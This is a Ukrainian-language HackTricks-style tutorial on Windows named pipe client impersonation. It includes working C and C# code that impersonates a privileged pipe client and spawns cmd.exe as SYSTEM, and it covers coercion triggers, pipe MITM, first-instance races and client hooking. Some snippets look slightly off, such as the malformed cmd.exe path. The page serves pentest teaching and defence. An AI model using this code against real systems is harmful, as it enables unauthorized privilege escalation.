# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation — це примітив локального підвищення привілеїв, який дає змогу потоку сервера named pipe перейняти контекст безпеки клієнта, що підключається до нього. На практиці зловмисник, який може виконувати код із SeImpersonatePrivilege, може змусити привілейований клієнт (наприклад, службу SYSTEM) підключитися до pipe, контрольованого зловмисником, викликати ImpersonateNamedPipeClient, продублювати отриманий token у primary token і запустити процес від імені клієнта (часто NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Ця сторінка зосереджена на основній техніці. Щоб переглянути повні exploit chain, які змушують SYSTEM підключитися до вашого pipe, дивіться наведені нижче сторінки сімейства Potato.

## TL;DR
- Створіть named pipe: \\.\pipe\<random> і очікуйте підключення.
- Змусьте привілейований компонент підключитися до нього (spooler/DCOM/EFSRPC/etc.).
- Прочитайте щонайменше одне повідомлення з pipe, потім викличте ImpersonateNamedPipeClient.
- Відкрийте impersonation token поточного потоку, виконайте DuplicateTokenEx(TokenPrimary) і використайте CreateProcessWithTokenW/CreateProcessAsUser, щоб отримати процес SYSTEM.<sup>[[2]](#references)</sup>

## Вимоги та ключові API
- Привілеї, які зазвичай потрібні процесу/потоку, що виконує виклик:
- SeImpersonatePrivilege для успішного impersonation клієнта, що підключається, і використання CreateProcessWithTokenW.
- Альтернативно, після impersonation SYSTEM можна використати CreateProcessAsUser, для якого можуть знадобитися SeAssignPrimaryTokenPrivilege і SeIncreaseQuotaPrivilege (ці привілеї доступні, коли ви impersonate SYSTEM).
- Основні API, що використовуються:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (перед impersonation необхідно прочитати щонайменше одне повідомлення)
- ImpersonateNamedPipeClient і RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW або CreateProcessAsUser
- Рівень impersonation: щоб виконувати корисні дії локально, клієнт має дозволяти SecurityImpersonation (типове значення для багатьох локальних RPC/named-pipe клієнтів). Клієнти можуть знизити його, використовуючи SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION під час відкриття pipe.<sup>[[3]](#references)</sup>

## Мінімальний робочий процес Win32 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Примітки:
- Якщо ImpersonateNamedPipeClient повертає ERROR_CANNOT_IMPERSONATE (1368), переконайтеся, що спочатку прочитали дані з pipe і що client не обмежив impersonation рівнем Identification.
- Надавайте перевагу DuplicateTokenEx із SecurityImpersonation і TokenPrimary для створення primary token, придатного для створення process.

## Швидкий приклад .NET
У .NET NamedPipeServerStream може виконувати impersonation через RunAsClient. Після початку impersonation продублюйте thread token і створіть process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Поширені тригери/примусове підключення SYSTEM до вашого pipe
Ці техніки змушують привілейовані служби підключатися до вашого named pipe, щоб ви могли їх impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Детальне використання та сумісність дивіться тут:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Якщо вам потрібен повний приклад створення pipe та impersonation для запуску SYSTEM через service trigger, дивіться:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Зловживання Named Pipe IPC та MITM (ACL, First-Instance Races, Client Hooking)

Коли привілейована служба та процес із низькими привілеями взаємодіють через `\\.\pipe\...`, розглядайте pipe як будь-яку іншу ненадійну межу IPC. Окрім класичного server-side impersonation, слабкі ACL pipe, небезпечні flags створення та рішення про довіру на стороні клієнта також можуть стати примітивами локального підвищення привілеїв.<sup>[[7]](#references)</sup>

### Спочатку перелікуйте candidate pipes
- Швидко перелічити pipes з PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` корисний для виявлення кількості instances і pipes з одним instance.
- У першу чергу перевіряйте імена, які використовують служби, що працюють як `SYSTEM`, особливо helpers, updaters, launchers і UI brokers.

### MITM через permissive DACL та додаткові pipe instances
- Будь-який процес, який може взаємодіяти з привілейованим server, уже може fuzz його protocol і шукати привілейовані verbs.<sup>[[7]](#references)</sup>
- Цікавіший випадок виникає, коли DACL надає `FILE_GENERIC_WRITE`/`GENERIC_WRITE` для pipe object. Для named pipes це неявно включає `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` використовує той самий bit), тому attacker може створити інший server instance з тим самим іменем.
- Оскільки instances зіставляються у FIFO-порядку, instances, створені attacker, і легітимні instances можуть чергуватися: створіть rogue instance за допомогою `CreateNamedPipe`, потім відкрийте pipe з тим самим іменем через `CreateFile` і дочекайтеся, поки реальний client підключиться до rogue server instance.
- Результат: спостереження, модифікація, relay або десинхронізація привілейованого IPC без необхідності отримувати контроль над оригінальним server process.

### First-instance race у pipe security descriptors
- `lpSecurityAttributes` визначає DACL лише тоді, коли створюється перший instance pipe з певним іменем.<sup>[[4]](#references)[[7]](#references)</sup>
- Якщо привілейована служба запускається із затримкою і не використовує `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker може заздалегідь створити pipe з потрібним іменем і permissive DACL, після чого служба створить наступні instances у security context, вибраному attacker.
- Це перетворює запуск служби на race condition: виграйте first instance, а потім підключайтеся до наступних clients або виконуйте MITM, використовуючи ослаблений ACL.
- Mitigation для defenders і важливий пункт перевірки для attackers: перевірте, чи містить `CreateNamedPipe(..., dwOpenMode, ...)` `FILE_FLAG_FIRST_PIPE_INSTANCE`. Якщо ні, протестуйте pre-creation до запуску служби.

### PID/signature checks — це hardening, а не boundary
- Деякі продукти намагаються обмежити доступ, перевіряючи `GetNamedPipeClientProcessId`, шлях до process image або Authenticode signer клієнта, що підключається.<sup>[[7]](#references)</sup>
- Це допомагає лише доти, доки ви не виконаєте injection у легітимний client: опинившись усередині trusted process, ви успадковуєте той самий PID/image/signature context, якого очікує server.
- Для split desktop apps instrumenting low-privileged UI/helper process часто простіше, ніж атака безпосередньо на `SYSTEM` service.

### Hook client відповідно до його I/O model
- Synchronous I/O: перехоплюйте `NtWriteFile` до того, як syscall використає buffer, і перевіряйте/змінюйте `NtReadFile` після його повернення.<sup>[[7]](#references)</sup>
- Overlapped I/O: збережіть `OVERLAPPED`/`IoStatusBlock`, побачені в `NtReadFile`, а потім перевірте buffer після завершення `GetOverlappedResult` або відповідного wait.
- Completion ports: `GetQueuedCompletionStatus` досягає `NtRemoveIoCompletion`; повернений `ApcContext` пов’язаний з `OVERLAPPED`, використаним оригінальним read, і це правильна точка для пошуку вже заповненого buffer.
- Completion routines (`ReadFileEx`): completion callback доставляється як APC. Якщо потрібно змінити повернені data або inject synthetic replies, hook реальну completion routine, а для custom injection використовуйте однопараметровий `QueueUserAPC` dispatcher, який відновлює 3 очікувані аргументи routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Примітки щодо tooling
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) проксує named-pipe traffic через injected helper DLL і надає Burp-подібний workflow для редагування/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) використовує підхід на основі Frida та зосереджується на hooking `NtReadFile`/`NtWriteFile` разом із наведеними вище async/completion pivots, після чого пересилає traffic до workflow редагування на основі WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Операційні міркування
- Іменовані канали мають низьку затримку; тривалі паузи під час редагування буферів можуть призвести до взаємного блокування нестійких служб.<sup>[[7]](#references)</sup>
- Клієнтам, що використовують overlapped/completion-port/APC-driven моделі, потрібні інші hooks, ніж простим detours для `ReadFile`/`WriteFile`.
- Ін’єкція у trusted client є помітною, тому зазвичай її найкраще використовувати для розробки експлойтів, реверсингу протоколів або fuzzing у локальній лабораторії.

## Усунення несправностей і підводні камені
- Потрібно прочитати щонайменше одне повідомлення з каналу перед викликом ImpersonateNamedPipeClient; інакше буде отримано ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Якщо клієнт підключається з SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, сервер не може повністю виконати impersonation; перевірте рівень impersonation токена через GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW вимагає SeImpersonatePrivilege у caller. Якщо це завершується помилкою ERROR_PRIVILEGE_NOT_HELD (1314), використовуйте CreateProcessAsUser після того, як ви вже виконали impersonation SYSTEM.
- Якщо ви harden-ите канал, переконайтеся, що його security descriptor дозволяє цільовій службі підключатися; за замовчуванням канали під `\\.\pipe` доступні відповідно до DACL сервера.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
